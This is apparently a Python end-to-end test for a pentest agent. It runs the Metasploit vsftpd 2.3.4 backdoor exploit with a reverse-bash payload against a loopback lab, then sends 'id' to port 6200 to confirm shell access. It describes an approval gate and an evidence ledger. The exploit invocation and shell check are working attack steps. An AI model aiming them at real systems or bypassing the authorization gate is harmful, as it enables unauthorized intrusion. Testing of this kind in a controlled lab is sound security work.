"""Prueba de fuego Metasploit REAL contra el lab vsftpd (loopback).

Requisitos (los levanta scripts/msf_e2e.sh):
  - msfrpcd corriendo (MSFRPCD_PASSWORD en env)
  - lab_vsftpd en 2121/6200
  - engagement.yaml con exploit/unix/ftp/vsftpd_234_backdoor en allowlist
  - PENTEST_EXPLOIT_APPROVED=ENG-LAB-2026-001 (en ESTE proceso = el cliente
    es tambien el operador del lab; en produccion vive en el servidor exploit)

Valida: gate completo -> modulo real -> sesion -> ledger -> shell check.
"""
import json
import os
import socket

MSF_MODULE = "exploit/unix/ftp/vsftpd_234_backdoor"


def shell_marker_check() -> bool:
    try:
        with socket.create_connection(("127.0.0.1", 6200), timeout=5) as s:
            s.settimeout(5)
            s.sendall(b"id\n")  # el backdoor real no saluda; responde comandos
            data = s.recv(256).decode(errors="replace")
            return "uid=" in data
    except OSError:
        return False


def main() -> None:
    from pentest_agent.tools.msf import run_msf_module

    print("gate:", "aprobado" if os.environ.get("PENTEST_EXPLOIT_APPROVED") else "FALTA APROBACION")
    rec = run_msf_module(
        "127.0.0.1",
        MSF_MODULE,
        {"RHOSTS": "127.0.0.1", "RPORT": "2121", "PAYLOAD": "cmd/unix/reverse_bash",
         "LHOST": "127.0.0.1"},
    )
    print(json.dumps(rec, indent=2)[:2000])
    print("shell-backdoor accesible:", shell_marker_check())
    ledger = "reports/evidence.jsonl"
    if os.path.exists(ledger):
        last = open(ledger).read().strip().splitlines()[-1]
        print("ledger:", last[:300])


if __name__ == "__main__":
    main()
